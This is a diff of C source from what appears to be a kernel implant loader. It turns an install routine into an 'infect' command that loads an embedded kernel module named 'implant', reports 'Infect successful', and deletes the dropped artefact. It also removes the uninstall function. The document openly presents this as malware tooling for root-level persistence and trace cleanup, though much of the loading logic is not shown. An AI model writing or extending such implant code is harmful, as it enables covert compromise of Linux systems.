@@ -1,13 +1,11 @@
+#include <status.h>
 #include <log.h>
+#include <module/infect.h>
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-#include <unistd.h>
-#include <sys/syscall.h>
+#include <syscall.h>
 #include <errno.h>
 
 /* The implant is embedded in this binary.
@@ -23,7 +21,7 @@ extern char _binary_implant_ko_end[];
 #define MODNAME "implant"
 #endif /* MODNAME */
 
-int install(void)
+static int infect(void)
 {
 	int status = 0;
 
@@ -61,14 +59,14 @@ int install(void)
 	close(fd);
 	if (ret) {
 		IMLOG_DEBUG("Failed to load kernel module");
-		if (errno == EPERM) {
-			fprintf(stderr,
-				"The program must be run with root privileges.\n");
-		}
+		if (errno == EPERM)
+			error("Infect requires root privilege.\n");
 
 		status = -1;
 		goto f;
 	}
+
+	alert("Infect successful.\n");
 
 f:
 	/* Remove artefact. */
@@ -77,18 +75,11 @@ f:
 	return status;
 }
 
-int uninstall(void)
+int infect_command_handler(int argc, char **argv)
 {
-	int ret = syscall(__NR_delete_module, MODNAME, 0);
+	/* TODO: There should be supported arguments for this command. */
+	(void)argc;
+	(void)argv;
 
-	if (ret) {
-		IMLOG_DEBUG("Failed to unload the kernel module");
-	}
-
-	if (ret && errno == EPERM) {
-		fprintf(stderr,
-			"The program must be run with root privileges.\n");
-	}
-
-	return ret;
+	return infect();
 }
